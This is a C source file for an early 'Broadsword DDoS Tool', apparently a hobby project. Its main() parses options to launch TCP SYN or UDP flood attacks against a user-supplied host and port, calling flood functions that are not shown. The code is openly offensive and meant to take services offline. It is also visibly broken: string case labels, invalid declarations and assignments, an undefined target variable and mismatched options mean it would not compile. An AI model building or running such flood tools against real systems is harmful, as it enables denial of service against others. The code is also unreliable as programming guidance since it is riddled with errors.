/*
* Broasword DDoS Tool
* v0.1
* By Brandon Hammond 
*/
//Include normal header files
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <libnet.h>

//Include custom header files
#include "/usr/lib/broadsword/tcp_flood.h"
#include "/usr/lib/broadsword/udp_flood.h"

//Main function
int main(int argc, char *argv[]) {
	/*
	 *The main() function parses command line
	 * options using getopt() 
	 */
	 
	 char opt; //Used for argparse()
	 
	 //Initialize switch values
	 int switch_tcp = 0;
	 int switch_udp = 0;
	 
	 while ((opt = getopt(argc, argv, "hsu")) != -1) {
		 switch (opt) {
			case "h":
				//Display help
				printf("USAGE: %s [-h|-t|-u] <target:port>\n", argv[0]); 
			case "t":
				//Attack is TCP SYN flood
				switch_tcp = 1;
				if (switch_udp == 1) {
					//Print error when -u used with -s
					printf("ERROR: Cannot use -u with -s\n");
					exit(0);
				}
				else {
					//Get target if proxy is not used
					char full_target[1024] == argv[2];
					
					//Seperate host from port
					char *delim = ":";
					
					//Individual host and port variables
					char *target_host[1024];
					char *str_port[1024];
					
					target_host = strtok(full_target, delim);
					str_port = strtok(NULL, full_target);
					
					int target_port = atoi(str_port);
				}
				printf("TCP SYN flooding\n");
				printf("CTRL-C to stop...\n");
				tcp_flood(target_ip, target_port);
			case "u":
				//Attack is UDP flood
				switch_udp = 1;
				if (switch_tcp == 1) {
					//Print error when -s is used with -u
					printf("ERROR: Cannot use -s with -u\n");
				}
				else {
					//Get target if proxy is not used
					char full_target[1024] == argv[2];
					
					//Seperate host from port
					char *delim = ":";
					
					//Individual host and port variables
					char *target_host[1024];
					char *str_port[1024];
					
					target_host = strtok(full_target, delim);
					str_port = strtok(NULL, full_target);
					
					int target_port = atoi(str_port);
				}
				printf("UDP flooding\n");
				printf("CTRL-C to stop...\n");
				udp_flood(target_ip, target_port);
			case default:
				//Display help
				printf("USAGE: %s [-h|-s|-u] <target:port>", argv[0]); 
		 }
	 }
}
